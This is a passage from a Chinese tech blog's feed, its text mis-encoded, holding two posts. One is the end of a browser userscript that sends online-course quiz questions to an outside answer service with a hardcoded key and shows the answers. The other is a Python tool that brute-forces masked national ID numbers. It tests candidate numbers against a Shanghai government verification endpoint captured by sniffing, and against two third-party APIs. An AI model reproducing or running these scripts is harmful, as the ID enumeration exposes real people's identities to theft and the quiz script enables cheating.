&quot;url(&#x27;https://i.postimg.cc/BZKZRRtJ/20220508084230592.jpg&#x27;)&quot;;</span></span><br><span class="line"></span><br><span class="line">tibody=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;questionItem question-item-box&quot;</span>);</span><br><span class="line">total = tibody.<span class="property">length</span>;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(tibody[index]);</span><br><span class="line"><span class="title function_">kaishi</span>(tibody[index]);<span class="comment">//ä¼ å…¥æ¯é“é¢˜</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                  <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ div å…ƒç´ </span></span><br><span class="line">                 <span class="keyword">let</span> newDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">                 <span class="comment">// ç»™å®ƒä¸€äº›å†…å®¹</span></span><br><span class="line">                 <span class="keyword">let</span> newContent = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;colincoraï¼Q3300519161&quot;</span>);</span><br><span class="line">                 <span class="comment">// æ·»åŠ æ–‡æœ¬èŠ‚ç‚¹ åˆ°è¿™ä¸ªæ–°çš„ div å…ƒç´ </span></span><br><span class="line">                 newDiv.<span class="title function_">appendChild</span>(newContent);</span><br><span class="line">                 newDiv.<span class="property">style</span>.<span class="property">position</span>=<span class="string">&#x27;fixed&#x27;</span>;</span><br><span class="line">                 newDiv.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&#x27;red&#x27;</span></span><br><span class="line">                <span class="comment">//  newDiv.style.width=&#x27;20px&#x27;;</span></span><br><span class="line">                <span class="comment">//  newDiv.style.length=&#x27;20px&#x27;;</span></span><br><span class="line">                newDiv.<span class="property">style</span>.<span class="property">fontSize</span>=<span class="string">&#x27;28px&#x27;</span>;</span><br><span class="line">              <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#beginHeaderNav&quot;</span>).<span class="title function_">appendChild</span>(newDiv);</span><br><span class="line">                newDiv.<span class="property">style</span>.<span class="property">top</span>=<span class="string">&#x27;60px&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">kaishi</span>(<span class="params">ti</span>)&#123;</span><br><span class="line">        <span class="title function_">GM_xmlhttpRequest</span>(&#123;<span class="comment">//æ²¹çŒ´è„šæœ¬æä¾›çš„å¼‚æ­¥å‡½æ•°</span></span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;http://cx.icodef.com/wyn-nb?v=4&#x27;</span>,<span class="comment">//ç½‘è¯¾æ¥å£</span></span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;NLUIeWEHQHBAapeH&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&#x27;question=&#x27;</span>+ <span class="built_in">encodeURIComponent</span>(ti.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-title-box&quot;</span>)[<span class="number">0</span>].<span class="property">innerText</span>),</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">2000</span>,</span><br><span class="line"></span><br><span class="line">            <span class="attr">onload</span>:<span class="keyword">function</span>(<span class="params">xhr</span>)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªåŠ¨é€‰æ‹©ç­”æ¡ˆ</span></span><br><span class="line">                <span class="keyword">let</span> json=<span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">                <span class="keyword">let</span> daan=json.<span class="property">data</span>;</span><br><span class="line"><span class="keyword">if</span>(json.<span class="property">code</span>==-<span class="number">1</span>)daan=<span class="string">&quot;ç­”æ¡ˆæœªæ‰¾åˆ°&quot;</span>;</span><br><span class="line"><span class="comment">// console.log(xhr.responseText.code);</span></span><br><span class="line"><span class="keyword">let</span> answerarray=daan.<span class="title function_">split</span>(<span class="string">&#x27;#&#x27;</span>);<span class="comment">//ç­”æ¡ˆæ•°ç»„</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> daanlength=ti.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;radio_item question-option-item-box&quot;</span>).<span class="property">length</span>;<span class="comment">//å¤šå°‘ä¸ªé€‰é¡¹</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;daanlength;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i2=<span class="number">0</span>;i2&lt;answerarray.<span class="property">length</span>;i2++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//  console.log(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;ã€&#x27;)[1]);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//if(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;ã€&#x27;)[1]==answerarray[i2])ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].firstElementChild.click();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾ç¤ºç­”æ¡ˆ</span></span><br><span class="line"> <span class="keyword">let</span> newdaan=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;answerarray.<span class="property">length</span>;i++)</span><br><span class="line"> &#123;</span><br><span class="line">     newdaan=newdaan+<span class="string">&#x27;&lt;br&gt;&#x27;</span>+answerarray[i];</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> ti.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-title-box&quot;</span>)[<span class="number">0</span>].<span class="property">innerHTML</span> += <span class="string">&quot;&lt;br&gt;ç­”æ¡ˆ:&quot;</span>+newdaan;</span><br><span class="line"> ti.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-title-box&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line"> ti.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-title-box&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">&quot;10px&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(index &lt; total - <span class="number">1</span>)<span class="comment">//ç»§ç»­æœç´¢æ¥ä¸‹æ¥çš„é¢˜</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">                      index = index + <span class="number">1</span>;</span><br><span class="line">                      <span class="title function_">kaishi</span>(tibody[index]);</span><br><span class="line"></span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">GM_addStyle</span>(<span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.button &#123;</span></span><br><span class="line"><span class="string">    background: #eb94d0 !important;</span></span><br><span class="line"><span class="string">  /* åˆ›å»ºæ¸å˜ */</span></span><br><span class="line"><span class="string">    background-image: -webkit-linear-gradient(top, #eb94d0, #2079b0);</span></span><br><span class="line"><span class="string">    background-image: -moz-linear-gradient(top, #eb94d0, #2079b0);</span></span><br><span class="line"><span class="string">    background-image: -ms-linear-gradient(top, #eb94d0, #2079b0);</span></span><br><span class="line"><span class="string">    background-image: -o-linear-gradient(top, #eb94d0, #2079b0);</span></span><br><span class="line"><span class="string">    background-image: linear-gradient(to bottom, #eb94d0, #2079b0);</span></span><br><span class="line"><span class="string">    /* ç»™æŒ‰é’®æ·»åŠ åœ†è§’ */</span></span><br><span class="line"><span class="string">    -webkit-border-radius: 28;</span></span><br><span class="line"><span class="string">    -moz-border-radius: 28;</span></span><br><span class="line"><span class="string">    border-radius: 28px;</span></span><br><span class="line"><span class="string">    text-shadow: 3px 2px 1px #9daef5;</span></span><br><span class="line"><span class="string">    -webkit-box-shadow: 6px 5px 24px #666666;</span></span><br><span class="line"><span class="string">    -moz-box-shadow: 6px 5px 24px #666666;</span></span><br><span class="line"><span class="string">    box-shadow: 6px 5px 24px #666666;</span></span><br><span class="line"><span class="string">    font-family: Arial;</span></span><br><span class="line"><span class="string">    color: #fafafa;</span></span><br><span class="line"><span class="string">    font-size: 5px;</span></span><br><span class="line"><span class="string">    padding: 3px;</span></span><br><span class="line"><span class="string">    text-decoration: none;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.button:hover&#123;</span></span><br><span class="line"><span class="string">background:#2079b0 !important;        /*:hover CSSä¼ªç±»,é¼ æ ‡æ‚¬åœæ•ˆæœ,è¿™é‡Œæ˜¯é¼ æ ‡æ”¾ä¸Šå»å°±å˜è‰²*/</span></span><br><span class="line"><span class="string">    background-image: -webkit-linear-gradient(top, #2079b0, #eb94d0);</span></span><br><span class="line"><span class="string">    background-image: -moz-linear-gradient(top, #2079b0, #eb94d0);</span></span><br><span class="line"><span class="string">    background-image: -ms-linear-gradient(top, #2079b0, #eb94d0);</span></span><br><span class="line"><span class="string">    background-image: -o-linear-gradient(top, #2079b0, #eb94d0);</span></span><br><span class="line"><span class="string">    background-image: linear-gradient(to bottom, #2079b0, #eb94d0);</span></span><br><span class="line"><span class="string">    text-decoration: none;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="ç½‘è¯¾" scheme="http://blog.ioimp.top/tags/%E7%BD%91%E8%AF%BE/"/>
    
  </entry>
  
  <entry>
    <title>èº«ä»½è¯äºŒè¦ç´ éªŒè¯</title>
    <link href="http://blog.ioimp.top/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/"/>
    <id>http://blog.ioimp.top/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/</id>
    <published>2022-08-17T09:03:17.000Z</published>
    <updated>2023-08-17T09:07:17.004Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SfzVertify"><a href="#SfzVertify" class="headerlink" title="SfzVertify"></a>SfzVertify</h1><h2 id="èº«ä»½è¯äºŒè¦ç´ éªŒè¯"><a href="#èº«ä»½è¯äºŒè¦ç´ éªŒè¯" class="headerlink" title="èº«ä»½è¯äºŒè¦ç´ éªŒè¯"></a>èº«ä»½è¯äºŒè¦ç´ éªŒè¯</h2><p>â€‹èº«ä»½è¯å·æ˜¯çš„ç¼–æ’æ˜¯æœ‰<strong>ä¸€å®šè§„å¾‹å¯å¾ª</strong>çš„ã€‚é™¤äº†æœ€å1ä½æ˜¯æ ¡éªŒä½å¤–ï¼Œå…¶ä½™å„ä½ä¸<strong>å‡ºç”Ÿåœ°</strong>ã€<strong>å‡ºç”Ÿæ—¥æœŸ</strong>ã€<strong>æ€§åˆ«</strong>ã€<strong>å‡ºç”Ÿç¼–å·</strong>æ¯æ¯ç›¸å…³ï¼Œå› æ­¤å³ä½¿æ˜¯<strong>ç»è„±æ•å¤„ç†</strong>çš„èº«ä»½è¯å·ï¼Œä»èƒ½é€šè¿‡ç¨‹åºåˆ†æçš„æ–¹å¼è¿‡æ»¤å‡ºå¯èƒ½çš„<strong>èº«ä»½è¯åºåˆ—ç»„åˆ</strong>ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>å‡ºç”Ÿåœ°</strong>ã€<strong>å‡ºç”Ÿæ—¥æœŸ</strong>ã€<strong>æ€§åˆ«</strong>ã€<strong>å‡ºç”Ÿç¼–å·</strong>è¿™äº›ä¿¡æ¯è¿›è¡Œèº«ä»½è¯çš„çŒœè§£ï¼Œä»è€Œå®ç°èº«ä»½è¯å·ç bp.</p><h3 id="è¿™ä¸ªAPIæ˜¯ä¸Šæµ·éšç”³åŠèº«ä»½è¯äºŒè¦ç´ æŠ“åŒ…æŠ“å‡ºæ¥çš„"><a href="#è¿™ä¸ªAPIæ˜¯ä¸Šæµ·éšç”³åŠèº«ä»½è¯äºŒè¦ç´ æŠ“åŒ…æŠ“å‡ºæ¥çš„" class="headerlink" title="è¿™ä¸ªAPIæ˜¯ä¸Šæµ·éšç”³åŠèº«ä»½è¯äºŒè¦ç´ æŠ“åŒ…æŠ“å‡ºæ¥çš„"></a>è¿™ä¸ªAPIæ˜¯ä¸Šæµ·éšç”³åŠèº«ä»½è¯äºŒè¦ç´ æŠ“åŒ…æŠ“å‡ºæ¥çš„</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    url = <span class="string">&quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;com.tencent.mm&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    pron_name=<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥è¦éªŒè¯çš„åå­—ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¿›è¡ŒäºŒè¦ç´ éªŒè¯ï¼Œè¯·è€å¿ƒç­‰å¾…..........&quot;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;sfz.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;pron_name&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;id_card&quot;</span>: line,</span><br><span class="line">            <span class="string">&quot;mw&quot;</span>: <span class="string">&quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, headers=headers, json=data).json()</span><br><span class="line">            <span class="keyword">if</span> (r[<span class="string">&#x27;code&#x27;</span>] == <span class="number">200</span>):</span><br><span class="line">                fok = <span class="built_in">open</span>(<span class="string">&quot;successful.txt&quot;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                fok.write(line)</span><br><span class="line">                fok.close</span><br><span class="line">            <span class="built_in">print</span>(line + <span class="string">&quot;|&quot;</span> + <span class="built_in">str</span>(r[<span class="string">&#x27;code&#x27;</span>]))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            fe = <span class="built_in">open</span>(<span class="string">&quot;fail.txt&quot;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">            fe.write(line)</span><br><span class="line">            fe.close</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–API"><a href="#å…¶ä»–API" class="headerlink" title="å…¶ä»–API"></a>å…¶ä»–API</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">suishenma</span>(<span class="params">name, idcard</span>):</span><br><span class="line">    url = <span class="string">&quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;com.tencent.mm&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;id_card&quot;</span>: <span class="built_in">str</span>(idcard),</span><br><span class="line">        <span class="string">&quot;mw&quot;</span>: <span class="string">&quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, headers=headers, json=data)</span><br><span class="line"></span><br><span class="line">        rescode = r.json()[<span class="string">&quot;code&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> (rescode == <span class="number">200</span>):</span><br><span class="line">            status = <span class="string">&quot;æ ¡éªŒæ­£ç¡®&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status = r.json()[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ä¸Šæµ·éšç”³ç : &quot;</span> + status)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guyunge</span>(<span class="params">name, idcard</span>):</span><br><span class="line">    url = <span class="string">&quot;https://api.guyunge.top/API/er.php&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;card&quot;</span>: <span class="built_in">str</span>(idcard),</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line">        rescode = r.json()[<span class="string">&quot;code&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> (rescode == <span class="number">1</span>):</span><br><span class="line">            status = <span class="string">&quot;æ ¡éªŒæ­£ç¡®&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status = r.json()[<span class="string">&quot;text&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å­¤äº‘é˜API: &quot;</span> + status)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tingfengke</span>(<span class="params">name, idcard</span>):</span><br><span class="line">    url = <span class="string">&quot;http://tc.tfkapi.top/API/eysjy.php&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;num&quot;</span>: <span class="built_in">str</span>(idcard),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, headers=headers, params=data).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (r == <span class="string">&quot;æ ¡éªŒæˆåŠŸ-TFK&quot;</span>):</span><br><span class="line">            status = <span class="string">&quot;æ ¡éªŒæ­£ç¡®&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status = r</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å¬é£å®¢API: &quot;</span> + status)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    suishenma(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    guyunge(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    tingfengke(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><h3 id="ä»£ç è¿›è¡Œæç¤º"><a href="#ä»£ç è¿›è¡Œæç¤º" class="headerlink" title="ä»£ç è¿›è¡Œæç¤º"></a>ä»£ç è¿›è¡Œæç¤º</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥åŒºå·å¼€å§‹ã€ä¾‹ï¼š230101å“ˆå°”æ»¨å¸‚è¾–åŒºã€‘ï¼š&quot;</span>)</span><br><span class="line">    a_1 = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥åŒºå·ç»“æŸã€ä¾‹ï¼šåŒºå·ç»“æŸ+1 230129+1å»¶å¯¿å¿ã€‘ï¼š&quot;</span>)</span><br><span class="line">    a_2 = <span class="built_in">int</span>(<span class="built_in">input</span>())  <span class="comment"># åŒºå·ç»“æŸ+1 230129+1å»¶å¯¿å¿</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥å‡ºç”Ÿå¹´æœˆæ—¥:ã€19820606ã€‘&quot;</span>)</span><br><span class="line">    s = <span class="built_in">input</span>() + <span class="string">&quot;****&quot;</span>  <span class="comment"># ä¸¾ä¾‹ï¼šèº«ä»½è¯å·ç¼ºåå››ä½</span></span><br></pre></td></tr></table></figure><p><img src="/images/bg1.jpg" alt="???"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="ç½‘å®‰" scheme="http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"/>
    
  </entry>
  
</feed>
